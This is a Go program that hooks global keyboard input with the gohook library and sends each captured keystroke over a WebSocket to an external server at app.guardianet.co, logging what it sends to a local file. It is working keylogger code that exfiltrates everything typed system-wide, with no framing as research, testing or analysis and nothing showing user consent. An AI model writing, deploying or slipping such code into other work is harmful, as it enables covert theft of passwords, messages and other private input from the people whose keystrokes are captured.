package main

import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"sync"
	"syscall"

	"github.com/gorilla/websocket"
	hook "github.com/robotn/gohook"
)

func main() {
	// Initialize logging
	logFile, err := setupLogging("error.log")
	if err != nil {
		fmt.Println("Failed to set up logging:", err)
		return
	}
	defer logFile.Close()

	wsURL := "wss://app.guardianet.co/api/ws/logger"

	// Connect to WebSocket server
	c, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
	if err != nil {
		log.Fatal("Error connecting to WebSocket server:", err)
	}
	defer c.Close()

	fmt.Println("Connected to WebSocket server. Listening for global keyboard input...")

	var wg sync.WaitGroup
	wg.Add(1)

	// Handle interrupt signals to gracefully exit
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Listen for global keyboard events using Rawcode
	go func() {
		defer wg.Done()
		evChan := hook.Start()
		defer hook.End()

		for {
			select {
			case <-sigChan:
				fmt.Println("Received shutdown signal. Exiting...")
				err := c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, "Client closing connection"))
				if err != nil {
					log.Println("Error sending close message:", err)
				}
				return
			case ev := <-evChan:
				if ev.Kind == hook.KeyDown {
					messageToSend := HandleKeyEvent(ev)

					// Send the message if it's non-empty
					if len(messageToSend) > 0 {
						err := c.WriteMessage(websocket.TextMessage, []byte(messageToSend))
						if err != nil {
							log.Println("WebSocket write error:", err)
							return
						}
						log.Printf("Sent: %s\n", messageToSend)
					}
				}
			}
		}
	}()

	wg.Wait()
}

// setupLogging initializes logging to a file
func setupLogging(logFileName string) (*os.File, error) {
	logFile, err := os.OpenFile(logFileName, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		return nil, err
	}
	log.SetOutput(logFile)
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	return logFile, nil
}
